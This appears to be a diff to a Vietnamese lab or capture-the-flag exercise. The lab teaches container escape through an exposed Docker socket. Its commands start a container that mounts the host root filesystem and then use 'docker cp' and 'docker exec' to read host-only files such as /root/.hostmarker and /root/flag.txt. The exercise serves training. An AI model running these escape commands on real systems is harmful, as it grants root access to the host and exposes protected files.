@@ -190,21 +190,19 @@ Bạn sẽ thấy một image tối giản có sẵn (ví dụ `escimg`) — ima
 
 **Bước 3:** Tạo một container mới **mount toàn bộ rootfs host (`/`)** vào `/host`, rồi `chroot` vào đó để có được ngữ cảnh "root trên host":
 ```bash
-docker -H unix:///var/run/docker.sock run --rm -it -v /:/host <IMAGE> chroot /host sh
+docker -H unix:///var/run/docker.sock run -d --name esc -v /:/host <IMAGE> sleep 3600
+docker -H unix:///var/run/docker.sock ps
 ```
-(thay `<IMAGE>` bằng image xuất hiện ở Bước 2). Bên trong, xác nhận đang ở trên host:
-```bash
-hostname
-ls -la /root
-```
-Gõ `exit` để thoát khỏi container tạm này.
+(thay `<IMAGE>` bằng image xuất hiện ở Bước 2). Container `esc` chạy nền và có toàn bộ rootfs host nằm tại `/host`.
 
-**Bước 4:** Lấy bằng chứng escape (canary chỉ tồn tại trên host) và lưu vào thư mục cá nhân — dùng một lệnh `docker run` không tương tác để nội dung được in thẳng ra terminal của `app` và có thể chuyển hướng ra file:
+> **Lưu ý (quan trọng để lấy output ổn định):** `/var/run/docker.sock` ở đây được nối tới daemon host qua proxy, nên lệnh `docker run` **chạy nền (`-d`)** rồi dùng `docker cp`/`docker logs` để lấy dữ liệu sẽ ổn định hơn so với `docker run` tương tác (`-it`) hay in thẳng ra terminal.
+
+**Bước 4:** Lấy bằng chứng escape (canary chỉ tồn tại trên host) từ container `esc` bằng `docker cp` và lưu vào thư mục cá nhân:
 ```bash
-docker -H unix:///var/run/docker.sock run --rm -v /:/host <IMAGE> \
-  chroot /host sh -c 'cat /root/.hostmarker' > ~/host_evidence.txt
+docker -H unix:///var/run/docker.sock cp esc:/host/root/.hostmarker ~/host_evidence.txt
 cat ~/host_evidence.txt
 ```
+(Muốn xem thêm trên host: `docker -H unix:///var/run/docker.sock exec esc ls -la /host/root`.)
 
 **Điều kiện hoàn thành nhiệm vụ:** Từ bên trong container `app`, tạo thành công một container mới qua socket, truy cập được rootfs của host và lưu đúng nội dung canary của host vào `~/host_evidence.txt`.
 
@@ -248,8 +246,7 @@ Trả lời: _______________________________________
 
 **Bước 1:** Đọc flag qua container tạm mount rootfs host, lưu ra file kết quả trong thư mục cá nhân để phục vụ chấm điểm:
 ```bash
-docker -H unix:///var/run/docker.sock run --rm -v /:/host <IMAGE> \
-  chroot /host sh -c 'cat /root/flag.txt' > ~/flag_result.txt
+docker -H unix:///var/run/docker.sock cp esc:/host/root/flag.txt ~/flag_result.txt
 cat ~/flag_result.txt
 ```
 
